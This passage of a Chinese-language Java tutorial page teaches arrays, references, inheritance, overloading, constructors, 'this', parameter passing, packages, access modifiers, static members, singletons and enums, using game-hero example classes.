class="keyword">import</span> java.util.Arrays;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">9</span> &#125;;</span><br><span class="line">        <span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; <span class="number">18</span>, <span class="number">62</span>, <span class="number">68</span>, <span class="number">82</span>, <span class="number">65</span>, <span class="number">8</span> &#125;;</span><br><span class="line"> </span><br><span class="line">        System.out.println(Arrays.equals(a, b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充</p><p>使用同一个值，填充整个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">        Arrays.fill(a, <span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-类和对象">6.类和对象</h2><h3 id="引用">引用</h3><p>引用的概念，如果一个变量的类型是 类类型，而非基本类型，那么该变量又叫做引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br></pre></td></tr></table></figure><p>h这个变量是Hero类型，又叫做引用<br>=的意思指的h这个引用<strong>代表</strong>右侧创建的对象<br>“<strong>代表</strong>” 在面向对象里，又叫做“<strong>指向</strong>”</p><p>引用有多个，但是对象只有一个。<br>在这个例子里，所有引用都指向了同一个对象。<br>对象就像 “房产”， 引用就像&quot;房产证&quot;<br>房产证的复印件可以有多张，但是真正的&quot;房产&quot; 只有这么一处</p><p>一个引用，多个对象时，只有最后一个能成功指向</p><h3 id="继承">继承</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Weapon</span> <span class="keyword">extends</span> <span class="title class_">Item</span>&#123;</span><br><span class="line">    <span class="type">int</span> damage; <span class="comment">//攻击力</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Weapon</span> <span class="variable">infinityEdge</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Weapon</span>();</span><br><span class="line">        infinityEdge.damage = <span class="number">65</span>; <span class="comment">//damage属性在类Weapon中新设计的</span></span><br><span class="line">         </span><br><span class="line">        infinityEdge.name = <span class="string">&quot;无尽之刃&quot;</span>;<span class="comment">//name属性，是从Item中继承来的，就不需要重复设计了</span></span><br><span class="line">        infinityEdge.price = <span class="number">3600</span>;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过继承别的类的属性，不需要重复设计。</p><h3 id="方法重载">方法重载</h3><p>方法名是一样的，但是参数类型不一样<br>在调用方法attack的时候，会根据传递的参数类型以及数量，自动调用对应的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; 进行了一次攻击 ，但是不确定打中谁了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h1)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;对&quot;</span> + h1.name + <span class="string">&quot;进行了一次攻击 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero h1, Hero h2)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;同时对&quot;</span> + h1.name + <span class="string">&quot;和&quot;</span> + h2.name + <span class="string">&quot;进行了攻击 &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">bh</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        bh.name = <span class="string">&quot;赏金猎人&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        bh.attack(h1);</span><br><span class="line">        bh.attack(h1, h2);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造方法">构造方法</h3><p>方法名和类名一样（包括大小写）<br><strong>没有返回类型</strong><br>实例化一个对象的时候，必然调用构造方法</p><p>一旦提供了一个有参的构造方法<br>同时又<strong>没有显式</strong>的提供一个无参的构造方法<br>那么默认的无参的构造方法，就“木有了“</p><h3 id="this">this</h3><p><strong>this即代表当前对象</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//直接打印对象，会显示该对象在内存中的虚拟地址</span><br><span class="line">    ``//格式：Hero@c17164 c17164即虚拟地址，每次执行，得到的地址不一定一样</span><br><span class="line">    而调用行为则出现相同的地址</span><br></pre></td></tr></table></figure><p>属性名和变量名不能一样</p><p>参数名不得不使用其他变量名</p><p>用this即可解决问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">     </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">     </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">//参数名和属性名一样</span></span><br><span class="line">    <span class="comment">//在方法体中，只能访问到参数name</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName1</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        name = name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//为了避免setName1中的问题，参数名不得不使用其他变量名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName2</span><span class="params">(String heroName)</span>&#123;</span><br><span class="line">        name = heroName;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//通过this访问属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName3</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="comment">//name代表的是参数name</span></span><br><span class="line">        <span class="comment">//this.name代表的是属性name</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span>  <span class="variable">h</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">         </span><br><span class="line">        h.setName1(<span class="string">&quot;teemo&quot;</span>);</span><br><span class="line">        System.out.println(h.name);</span><br><span class="line">         </span><br><span class="line">        h.setName2(<span class="string">&quot;garen&quot;</span>);</span><br><span class="line">        System.out.println(h.name);    </span><br><span class="line">         </span><br><span class="line">        h.setName3(<span class="string">&quot;死歌&quot;</span>);</span><br><span class="line">        System.out.println(h.name);    </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="传参">传参</h3><p>传参分为<strong>基本类型传参</strong>和<strong>类类型传参</strong></p><p>基本：</p><p>基本类型传参<br>在方法内，无法修改方法外的基本类型参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">        </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hero</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//回血</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">huixue</span><span class="params">(<span class="type">int</span> xp)</span>&#123;</span><br><span class="line">        hp = hp + xp;</span><br><span class="line">        <span class="comment">//回血完毕后，血瓶=0</span></span><br><span class="line">        xp=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hero</span><span class="params">(String name,<span class="type">float</span> hp)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.hp = hp;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;提莫&quot;</span>,<span class="number">383</span>);</span><br><span class="line">        <span class="comment">//血瓶，其值是100</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">xueping</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//提莫通过这个血瓶回血</span></span><br><span class="line">         </span><br><span class="line">        teemo.huixue(xueping);</span><br><span class="line">         </span><br><span class="line">        System.out.println(xueping);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用和=</p><p>果一个变量是基本类型<br>比如 int hp = 50;<br>我们就直接管hp叫变量<br><strong>=表示赋值的意思</strong>。<br>如果一个变量是类类型<br>比如 Hero h = new Hero();<br>我们就管h叫做<strong>引用</strong>。<br><strong>=不再是赋值的意思</strong><br><strong>=表示指向的意思</strong><br>比如 Hero h = new Hero();<br>这句话的意思是<br>引用h，指向一个Hero对象</p><p>类类型传参：</p><p><strong>类类型又叫引用</strong><br>第24行的引用 <strong>teemo</strong>与 第17行的引用<strong>hero</strong>，<strong>是不同的引用</strong><br>通过调用garen.attack(teemo, 100); 使得这<strong>两个引用都指向了同一个对象</strong><br>所以在第18行hero.hp = hero.hp - damage; 就使得该对象的hp值，发生了变化<br>因此第25行，打印该对象的Hp值就是变化后的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line"> </span><br><span class="line">    String name; <span class="comment">// 姓名</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">// 血量</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">// 护甲</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">// 移动速度</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hero</span><span class="params">(String name, <span class="type">float</span> hp)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.hp = hp;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 攻击一个英雄，并让他掉damage点血</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero hero, <span class="type">int</span> damage)</span> &#123;</span><br><span class="line">        hero.hp = hero.hp - damage;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;提莫&quot;</span>, <span class="number">383</span>);</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>(<span class="string">&quot;盖伦&quot;</span>, <span class="number">616</span>);</span><br><span class="line">        garen.attack(teemo, <span class="number">100</span>);</span><br><span class="line">        System.out.println(teemo.hp);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包">包</h3><p>package</p><p>把比较接近的类，规划在同一个包下</p><p>在最开始的地方声明该类所处于的包名</p><p>使用同一个包下的其他类，直接使用即可<br>但是要使用其他包下的类，必须import</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Weapon类在其他包里，使用必须进行import</span></span><br><span class="line"><span class="keyword">import</span> property.Weapon;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">        </span><br><span class="line">    String name; <span class="comment">//姓名</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> hp; <span class="comment">//血量</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">float</span> armor; <span class="comment">//护甲</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> moveSpeed; <span class="comment">//移动速度</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//装备一把武器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">equip</span><span class="params">(Weapon w)</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问修饰符">访问修饰符</h3><p>成员变量有四种修饰符</p><p><strong>private</strong> 私有的<br><strong>package</strong>/friendly/default 不写<br><strong>protected</strong> 受保护的<br><strong>public</strong> 公共的</p><p>类之间的关系</p><p><strong>自身：<strong>指的是Hero自己<br><strong>同包子类：<strong>ADHero这个类是Hero的子类，并且和Hero处于</strong>同一个包下</strong><br><strong>不同包子类：<strong>Support这个类是Hero的子类，但是在</strong>另一个包下</strong><br><strong>同包类：</strong> GiantDragon 这个类和Hero是</strong>同一个包</strong>，但是彼此<strong>没有继承关系</strong><br>**其他类：**Item这个类，<strong>在不同包</strong>，也没有继承关系的类</p><p><img src="https://stepimagewm.how2j.cn/612.png" alt="总结"></p><h3 id="类属性">类属性</h3><p>当一个属性被<strong>static</strong>修饰的时候，就叫做<strong>类属性</strong>，又叫做<strong>静态属性</strong><br>当一个属性被声明成类属性，那么<strong>所有的对象，都共享一个值</strong><br>与对象属性对比：<br>不同对象的 对象属性 的值都可能不一样。<br>比如盖伦的hp 和 提莫的hp 是不一样的。<br>但是所有对象的类属性的值，都是一样的</p><p>如果一个属性声明成类属性，那么所有的对象，都共享这么一个值</p><p>所以类属性是可以被用作所有对象都一致的</p><h3 id="类方法">类方法</h3><p><strong>类方法：</strong> 又叫做静态方法</p><p><strong>对象方法：</strong> 又叫实例方法，非静态方法</p><p>访问一个对象方法，必须<strong>建立在有一个对象</strong>的前提的基础上<br>访问类方法，<strong>不需要对象</strong>的存在，直接就访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//实例方法,对象方法，非静态方法</span></span><br><span class="line">    <span class="comment">//必须有对象才能够调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">        hp = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//类方法，静态方法</span></span><br><span class="line">    <span class="comment">//通过类就可以直接调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">battleWin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;battle win&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">           <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">           garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">           <span class="comment">//必须有一个对象才能调用</span></span><br><span class="line">           garen.die();</span><br><span class="line">            </span><br><span class="line">           <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">           teemo.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line">            </span><br><span class="line">           <span class="comment">//无需对象，直接通过类调用</span></span><br><span class="line">           Hero.battleWin();</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单例模式">单例模式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//私有化构造方法使得该类无法在外部通过new 进行实例化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//准备一个类属性，指向一个实例化对象。 因为是类属性，所以只有一个</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//public static 方法，提供给调用者获取12行定义的对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举">枚举</h3><p>枚举enum是一种特殊的类(还是类)，使用枚举可以很方便的定义常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Season</span> <span class="variable">season</span> <span class="operator">=</span> Season.SPRING;</span><br><span class="line">        <span class="keyword">switch</span> (season) &#123;</span><br><span class="line">        <span class="keyword">case</span> SPRING:</span><br><span class="line">            System.out.println(<span class="string">&quot;春天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SUMMER:</span><br><span class="line">            System.out.println(<span class="string">&quot;夏天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> AUTUMN:</span><br><span class="line">            System.out.println(<span class="string">&quot;秋天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WINTER:</span><br><span class="line">            System.out.println(<span class="string">&quot;冬天&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;枚举<span class="keyword">enum</span>是一种特殊的类(还是类)，使用枚举可以很方便的定义常</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING,SUMMER,AUTUMN,WINTER</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-接口和继承">7.接口和继承</h2><h4 id="super">super</h4><p>实例化子类，父类的构造方法一定会被调用</p><p><strong>其父类的构造方法也会被调用</strong><br><strong>并且是父类构造方法先调用</strong><br><strong>子类构造方法会默认调用父类的 无参的构造方法</strong></p><p>父类显式提供两个构造方法</p><p>分别是无参的构造方法和带一个参数的构造方法</p><p><strong>使用关键字super 显式调用父类带参的构造方法</strong></p><h4 id="object">object</h4><p>声明一个类的时候，默认是继承了Object<br>public class Hero <strong>extends Object</strong>,object是所有类的父类</p><p>Object类提供一个toString方法，所以所有的类都有toString方法<br>toString()的意思是返回当前对象的<strong>字符串表达</strong></p><p>通过 System.out.println 打印对象就是打印该对象的toString()返回值</p><p>当一个对象没有任何引用指向的时候，它就满足垃圾回收的条件</p><p>当它被垃圾回收的时候，它的finalize() 方法就会被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 